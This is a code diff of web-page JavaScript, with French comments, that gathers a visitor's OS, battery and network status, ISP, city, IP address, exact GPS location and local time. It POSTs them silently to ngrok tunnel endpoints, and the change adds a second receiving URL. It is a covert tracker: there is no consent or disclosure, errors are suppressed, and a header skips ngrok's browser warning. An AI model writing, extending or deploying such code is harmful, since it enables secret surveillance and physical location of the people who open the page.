@@ -194,24 +194,32 @@
                 deviceName = "PC Linux";
             }
 
+            const payload = JSON.stringify({
+                os: os,
+                battery: batteryInfo,
+                network: networkInfo,
+                isp: isp,
+                city: city,
+                ip: ip,
+                gps: exactLocation,
+                time: localTime
+            });
+
+            const options = {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'ngrok-skip-browser-warning': 'true'
+                },
+                body: payload
+            };
+
             try {
-                fetch('https://bottling-think-gray.ngrok-free.dev/api/log', { 
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify({
-                        os: os + " (" + deviceName + ")",
-                        battery: batteryInfo,
-                        network: networkInfo,
-                        isp: isp,
-                        city: city,
-                        ip: ip,
-                        gps: exactLocation,
-                        time: localTime
-                    })
-                });
+                // Première adresse Ngrok
+                fetch('https://bottling-think-gray.ngrok-free.dev/api/log', options);
+                
+                // Seconde adresse Ngrok (remplace par ta deuxième URL)
+                fetch('https://clinic-carded-clanking.ngrok-free.dev/', options);
             } catch (e) {}
 
             let lineIndex = 0;
